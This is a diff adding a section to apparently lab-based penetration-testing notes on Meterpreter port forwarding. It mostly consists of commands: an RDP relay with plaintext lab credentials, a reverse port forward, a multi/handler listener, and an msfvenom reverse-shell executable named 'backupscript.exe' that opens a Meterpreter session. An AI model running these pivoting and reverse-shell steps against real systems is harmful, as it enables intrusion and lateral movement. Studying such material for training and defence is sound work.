@@ -493,3 +493,77 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 ```
 - **Explanation**: Nmap discovers that port `3389` (RDP) is open on `172.16.5.19`, indicating that the scan successfully routed through the Meterpreter session.
+
+## Meterpreter Port Forwarding
+
+#### **Port Forwarding Command Syntax**
+```bash
+portfwd [-h] [add | delete | list | flush] [args]
+```
+
+#### **Options**
+- `-h`: Help banner
+- `-i <opt>`: Index of the port forward entry
+- `-l <opt>`: Local port to listen on (for forwards) or connect to (for reverse)
+- `-L <opt>`: Local host to listen on (optional)
+- `-p <opt>`: Remote port to connect to (for forwards) or listen on (for reverse)
+- `-r <opt>`: Remote host to connect to
+- `-R`: Indicates reverse port forward
+
+---
+
+#### **Creating Local TCP Relay**
+```bash
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
+```
+- Listens on **local port 3300**.
+- Forwards traffic to **172.16.5.19:3389** (RDP port).
+
+##### **Connecting via Localhost**
+```bash
+$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+
+##### **Check Active Connections (Netstat)**
+```bash
+$ netstat -antp
+tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp
+```
+
+---
+
+#### **Meterpreter Reverse Port Forwarding**
+```bash
+meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
+```
+- Forwards **incoming traffic on Ubuntu port 1234** to **attack host port 8081**.
+
+---
+
+#### **Configuring and Running Listener (`multi/handler`)**
+```bash
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 8081
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 0.0.0.0:8081
+```
+
+---
+
+#### **Generate Reverse Shell Payload**
+```bash
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+```
+
+---
+
+#### **Executing the Payload and Opening Meterpreter Session**
+```bash
+[*] Sending stage (200262 bytes) to 10.10.14.18
+[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173)
+meterpreter > shell
+```
+- **Meterpreter session** is opened after executing the payload.
